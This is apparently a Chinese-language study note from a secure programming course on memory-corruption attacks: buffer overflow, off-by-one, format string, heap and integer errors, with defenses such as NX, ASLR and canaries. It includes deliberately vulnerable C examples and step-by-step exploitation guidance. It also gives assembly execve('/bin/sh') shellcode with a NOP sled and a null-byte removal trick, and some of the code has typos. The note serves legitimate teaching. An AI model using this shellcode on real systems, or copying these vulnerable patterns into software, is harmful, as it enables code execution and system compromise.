# Attacks And Defenses（攻击和防御）

## 1. Buffer Overflow

### description

Buffer Overflow 是最古老和普遍的程序漏洞，通常在程序运行时，如果接受到来自不被信任的第三方的参数并且未对第三方参数进行长度检测和限制时，就存在buffer overflow漏洞。而一旦程序的漏洞被黑客得知，黑客就可以通过控制第三方的参数来使程序执行任意代码。通常利用buffer overflow的方式是获取目标主机的remote shell。

<img src="C:\Users\Enjiang He\AppData\Roaming\Typora\typora-user-images\image-20211203201240174.png" alt="image-20211203201240174" style="zoom: 50%;" />

**注：本文中caller代表去调用其他函数的函数，而callee代表被调用的函数**

Before attack：程序执行时（图中Function是caller function）。函数栈的保存方式是caller 调用callee 的parameters 从右到左依次入栈，之后是caller's eip和caller‘s ebp依次入栈。这就完成了一个新函数执行前的所有准备过程。此时开始进入到callee的执行过程。首先开始分配callee 的local var: buffer（此处buffer的长度会直接影响到之后执行attack的难度）。

After attack: 攻击时，因为第三方为止长度的参数传递给了buffer，此时程序并没有检查第三方参数的长度。如果第三方参数的长度超过了buffer，那么超过的部分就会继续overwrite buffer之上的内容，基本上就是buffer以上的所有栈的帧都会被第三方操控。最常见的用法是：overwrite saved eip，这样当callee return时，在epilog 阶段，就会把被corrupted saved eip 写进eip，此时CPU下一步执行的就不是原来的eip而是由第三方指定的任意位置。

```c
int
main(int argc, char *argv[])[])//argv is an array of ptr to char; argc the length of argv

{
  char *secret = "Tom loves Lucy"；
  char *changed_secret = "Hoen loved Hui"
  int flag = 0;
  char dest[64];
  strcpy(dest, argv[1]);//strcpy函数并不会检查dest的长度，这就时buffer overflow可能发生的地方
    
    if(flag == 1){
        printf("His secret is：%s", &secret);
    }
    
  return (0);
}

```

上述代码中，由于argv[1]来自程序外部，并不受程序控制。而strcpy也不会检查参数的长度，所以存在buffer overflow漏洞。

### Attack Process

1. 只overwrite saved eip，使程序执行第三方指定的任意位置的代码。比如执行printf函数

   - 计算出dest的首地址到saved eip的距离是多少bytes（可以gdb调试工具p/d 命令）;
   - 查看main函数中printf的地址（使用gdb中disas命令可以查看main的汇编版本）
   - 然后构造相应长度的payload,此处payload中的所有内容可以是4个字节一组printf函数的地址（注意系统的寻址方式是big-endian or little-endian）。 也可与NOP（0x90）组合（将saved eip之前的内容全部或者部分替换为NOP或者其他任意字符）。
   - 将payload通过命令行传入main。

2. 重写在dest上的任意变量。比如将secret变成changed_secret，使得print输出的内容不再是原来的secret。

   - 步骤与上个attack基本一致

3. overwrite saved eip，而且将新的eip指向dest的起始位置（或者大于dest的位置），执行第三方的任意机器代码。比如执行/bin/sh（****）

   - 首先我们需要知道Linux中如何通过C语言执行/bin/sh（一般的语言中都由相对应的系统调用方法）

     - ```C
       void function() {
        char *name[2];
       
        name[0] = "/bin/sh";
        name[1] = NULL;
        /* exe, argv[ ], envp[ ] */
        execve(name[0], name, NULL);//execve 是C中执行系统调用的lib call
       }
       
       ```

     - 通过以上的代码我们就可以通过execve(）函数去执行/bin/sh. 由于execve是在C的标准库的，所以每个C程序执行时都会加载这个库，所以我们需要知道的就是execve()在程序运行时的地址。（**这就是大名鼎鼎的Return-into-libc attack**），但是大多数情况下我们并不知道程序运行时C标准库的地址

     - Libc的加载位置我们不知道，但是想一想execve是如何执行/bin/sh的？**肯定底层还是system call**嘛

       通过对libc中的execve进行disassemble：

       ```assembly
       NULL								EBP + 0x10		16		EDX
       name(a pointer to ptr to”/bin/sh”)	EBP + 0xC		12		ECX
       name[0](a pointer to “/bin/sh”)		EBP + 0x8		08		EBX
       Return address						EBP + 0x4		04
       Saved frame pointer					EBP + 0x0		00
       ####以上是execve执行系统调用时函数栈的模型展示
       pushl %ebp				#save current frame pointer
       movl %esp,%ebp			#initialize new frame pointer
       movl 0x8(%ebp),%ebx		#ptr to “/bin/sh” goes in ebx
       movl 0xc(%ebp),%ecx		#ptr to ptr to “/bin/sh” ecx
       movl 0x10(%ebp),%edx	#NULL goes to edx
       movl $0xb,%eax			#0xb goes in eax
       int $0x80				#interupt from software
       ```

       通过上述的汇编我们可以看出，在进入int 0x80（software interrupt）之前，system call number 进了eax，“/bin/sh”进入了ebx, name(参数列表）进入了edx。简单的来说，调用system call首先需要将system call number，执行程序的路径，参数列表等数据都push到registers里，然后执行software interrupt 转换到kernel mode。那为什么我们需要这么麻烦的将这些数据存入registers呢？因为系统调用必须在kernel mode下执行，而CPU在kernel mode下就无法访问到用户拥有的process address space进而就更无法访问到stack上的数据了，所以需要提前把系统调用需要的参数存入到registers中。

     - 下一步我们就来考虑如何写我们的payload了（一下就是我们构建payload的部分）

       - **Null terminate “/bin/sh”**
       - **Construct name array on the stack**
       - **Fill registers** 
       - **Execute software interrupt**

     - 根据以上的提示我们可以写出一下的汇编语言（AT&T）使用system call 执行/bin/sh

       ​	

       ```assembly
       #ATTENTION !!!!! This payload in address space is Low to high
       NOP						#Slide
       ...						#Slide
       NOP						#Slide
       jmp L1					#Go to L1
       L2:popl %esi			#Pop address of “/bin/sh”,  esi points to “/bin/sh”
       # Build array, invoke execve
       movl $0x0,%eax			#Put 0 in eax
       movb $0x0,0x7(%esi)		#Null terminate the “/bin/sh”
       pushl %eax				#Put null on the stack   
       pushl %esi				#Put ptr to “/bin/bin” on the stack
       movl $0x0,%edx			#Put null in edx
       movl %esp,%ecx			#Ptr to ptr to “/bin/sh” in ecx
       movl %esi,%ebx			#Ptr to ”/bin/sh” in ebx
       movl $0xb,%eax			#Put 0xb in eax
       int $0x80				#Trap in kernel
       L1:call L2				#GO to L2 but push the address of”/bin/sh” onto stack
       .string ‘‘/bin/sh’’
       .string ‘‘/bin/sh’’
       .string ‘‘/bin/sh’’
       New return address ***	
       ```

     - 上面的就是我们汇编版本的malicious code，注意以上是从Low to high的方式。接下来还有一个问题要解决。因为我们的malicious code是以字符串的形式传入程序的，所以程序对待字符串就是遇到0x0就视为字符串结束了，我们上面的汇编代码中有好几处0的存在，从而会导致我们转换出来的二进制代码中也有0x0的存在。那么就会使得我们自己的malicious code会把自己给终结了，显然这不是我们想要的。

     - 于是我们可以对以上的汇编进行调整（这也是漏洞攻击中构建payload的一个技巧：通过xor操作或者movb的操作消除payload中的0x0）

       ```assembly
       #ATTENTION !!!!! This payload in address space is Low to high
       NOP						#Slide
       ...						#Slide
       NOP						#Slide
       jmp L1					#Go to L1
       L2:popl %esi			#Pop address of “/bin/sh”,  esi points to “/bin/sh”
       # Build array, invoke execve
       xorl %eax,%eax			#use xor to zero eax
       movb %eax,0x7(%esi)		#Null terminate the “/bin/sh”
       pushl %eax				#Put null on the stack   
       pushl %esi				#Put ptr to “/bin/bin” on the stack
       movb %eax,%edx			#Put null in edx
       movl %esp,%ecx			#Ptr to ptr to “/bin/sh” in ecx
       movl %esi,%ebx			#Ptr to ”/bin/sh” in ebx
       movb $0xb,%eax			#Put 0xb in eax
       int $0x80				#Trap in kernel
       L1:call L2				#GO to L2 but push the address of”/bin/sh” onto stack
       .string ‘‘/bin/sh’’
       New return address ***	
       ```

       上面代码中的xor操作都好理解，最后到movb $0xb, %eax是因为如果是movl，那么0xb的高位字节全是0x0，所以我们可以直接只将0xb的Least significant byte赋给eax。

     - 到这里就基本完成我们的payload的汇编版本，后面就是利用gdb将上述的汇编代码转变成机器代码，最后的injection code = NOP + malicious binary code(dumped from above assemble) + New return address。(注意：这里NOP的长度取决于我们发生buffer overflow的buffer到saved eip有多大)

4. ##### 以上三种方法都是buffer overflow的常用攻击方式。当然还有get remote shell或其他各种类型通过机器代码执行system call的没有涉及。但是基本的套路就是：

   - **确定想要injection code执行的功能**
   - **把功能拆分，拆分成最原子的system call（比如get remote shell就需要socket， listen....etc....）**
   - **然后去Linux文档中寻找每一个system call的编号，需要的参数**
   - **利用汇编构建调用system call的参数，并调用system call（需要注意0x0的影响）**
   - **测试汇编代码（注意如果有参数在. text section的话会报segmentation fault， 因为.text section is ro）**
   - **将测试的汇编代码 通过gdb的x/Nx(N:代表长度)dump成binary代码**
   - **构架最后的injection code**

### How to Defense buffer overflow

​		因为buffer overflow出现得极为早，所以防护buffer overflow的技术也有。除开在编写程序时，对所有第三方的数据进行强验证之外，另外一个主要的方面就是通过程序的运行机制来预防buffer overflow。

- A [non-executable](https://en.wikipedia.org/wiki/NX_bit) stack can prevent some buffer overflow exploitation. (但是不能防return-into-libc)
- [Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (ASLR) makes this type of attack extremely unlikely to succeed on [64-bit machines](https://en.wikipedia.org/wiki/64-bit_computing) as the memory locations of functions **are random**. For [32-bit systems](https://en.wikipedia.org/wiki/32-bit_computing), however, ASLR provides little benefit since there are only 16 bits available for randomization, and they can be defeated by [brute force](https://en.wikipedia.org/wiki/Brute-force_attack) in a matter of minutes

- StackGuard, 原理: inserting a small value known as a **canary** between the stack vsariables (buffers) and the function return address，When a stack-buffer overflows into the function return address, the canary is overwritten. During function return the canary value is checked and if the value has changed the program is terminated. 详见：https://access.redhat.com/blogs/766093/posts/3548631
- ProPolice，https://en.wikipedia.org/wiki/Buffer_overflow_protection

## 2. Off-By-One-Byte Errors

### 	Description 

​		

```C

int
main(int argc, char *argv
{                           	
  char dest[64];            			  	//length of argv
    
  if (strlen(argv[1]) <= sizeof (dest)) { 	//off by 1 error
    strcpy(dest, argv[1]);                	//”0\“terminnater
  }                       //when argv[1].length = 64, LSB of saved ebp will be overwrite

  return (0);
}
```

上述代码中，由于在判断dest和argv[1]长度时使用了<=。于是在strlen(argv[1]) = 64时，也能顺利通过if条件分支，但是由于采用的时strcpy function，而字符串结尾必须有null terminator“0x0”，所以除开argv[1]的64 bytes会被写到dest中之外，临近dest的saved ebp的LSB也会被overwriten to 0x00。于是当main函数返回时epilog阶段，corrupted saved ebp 会被restored（mov ebp, esp; pop ebp）,到这一步，一切都还算正常。但是下一次当main的caller returns to its caller时，同样的epilogue却会发生问题。我们知道epilogue其实包括leave(mov ebp, esp; pop ebp)和ret(pop eip), 其中ret这一步是将栈顶（esp）pop到eip中，而此时的esp是由leave operation中的corrupted ebp，然后pop ebp这一operation会让esp + 4，即当前的esp是corrupted ebp + 4.这样一来在main函数的caller‘s caller的eip就被改变成了corrupted ebp + 4. 而这个地址是可能被第三方控制的。

| saved eip            |                                                              |      |
| -------------------- | ------------------------------------------------------------ | ---- |
| saved ebp(corrupted) | the corrupted ebp looks like: 0xcfffdc00(we assume normal is:0xcfffdcdd) |      |
| dest[64]             | so the corrupted ebp will point to somewhere under saved ebp, maybe in dest or under the dest |      |
|                      |                                                              |      |

### Attack Off by 1 bytes error

好了，那么如何攻击呢？对off by one byte漏洞进行攻击其实是需要一定的运气成分的，因为你不知道正确的saved ebp到底是多少，从而只能猜测当把它的LSB置0后corrupted ebp的位置，如果是指向dest中（第三方控制下），那么我们可以使用上述buffer overflow的攻击方式去攻击。如果指向了dest之下，我们就无能为力了。

## 3. Format String Attacks

这是一种针对format specifier 的攻击，当程序运行时，来自第三方的参数没有检查是否是合法的字符串之前就在程序中使用，特别是在printf一类的函数当中使用时，就会导致format string error。

```c
#include  <stdio.h> 
void main(int argc, char **argv)
{
	// This line is safe
	printf("%s\n", argv[1]);

	// This line is vulnerable
	printf(argv[1]);
}
```

上述代码中，argv[1]来自命令行参数。It's safe in the first printf, but the second one could go wrong因为并没有提供format specifier，如果argv[1]类似：“%s%s%s%s%s”那么程序就会去从当前stack frame的位置开始找pointer to string，然后其中可能遇到非法地址，就会crash。通过不同的format spceifier 我们基本就可以获取到程序stack frame的信息（%p, %d, %c, %x）,其中最特殊的一个是%n，它的作用就是向一个地址中写入一个整型数字。我们可以利用这个format specifier向stack frame中的任意位置写入任意值。

<img src="C:\Users\Enjiang He\AppData\Roaming\Typora\typora-user-images\image-20211204210916777.png" alt="image-20211204210916777" style="zoom: 50%;" />

```c
#include  <stdio.h>
void main(int argc, char **argv)
{
	char buf[100];
	snprintf(buf, sizeof buf, argv[1]);
    snprintf(buf, sizeof buf, "%s", argv[1]);//safe
}
```

### Attack Format String Attack

上述代码我们完全可以分析出main函数的stack frame，然后构建对应的argv[1]我们就可以获取stack frame信息，并且通过多次尝试打印出save eip，save ebp等，然后通过%n就可以改变save eip使得程序执行任意位置的代码或者插入的payload。

详见：https://owasp.org/www-community/attacks/Format_string_attack

## 4. Heap Overflow Attacks

是一种buffer overflow详见：https://resources.infosecinstitute.com/topic/heap-overflow-vulnerability-and-heap-internals-explained/

## 5. Integer Errors

主要是三种：unfer flow/overflow, signed error, truncation.

#### under flow and overflow

这个其实都好理解，因为整形类型在各种语言中都有至少2种（int, long, short.....）。我们这里以C语言种的signed char来举例。其实在强类型语言的算数运算是一种模运算，我们可以想象成-128~0~127构成一个圆盘表，那么当-128-1这种情况下的时候会发生什么呢？加法就是正方向走，减法就是负方向走（计算机底层是没有减法的逻辑电路的，减法是通过实现了Two's complement从而相当于做加法），而-128-1此时就会向负方向走一格变成127，这就是under flow。overflow就更好理解了，127+1，此时就会向正方向走一步，变成了-128.

#### signed error

解释signed error之前，我们需要知道integral promotion, 当在一个expression种存在short, char，int之类的混合整形，c会自动将改表达式中的所有类型除开unsigned int提升到signed int。此时表达式中就有了混合的singed int和unsigned int,那么这个时候singed error就出现了·    
After **integral promotion,** we are left with a mix of unsigned and signed ints. What do we do? In this case everything is converted to **an unsigned int**. If the sign bit in one of the signed integers is enabled (i.e., we have a negative number) then it is interpreted as **a large positive number**. This is a sign error.

#### Truncation

Truncation e.g., taking an unsigned int and putting it an unsigned short

本文是对DCU CA647 Secure Programing 课程的exploit attack and defence部分进行的总结和学习
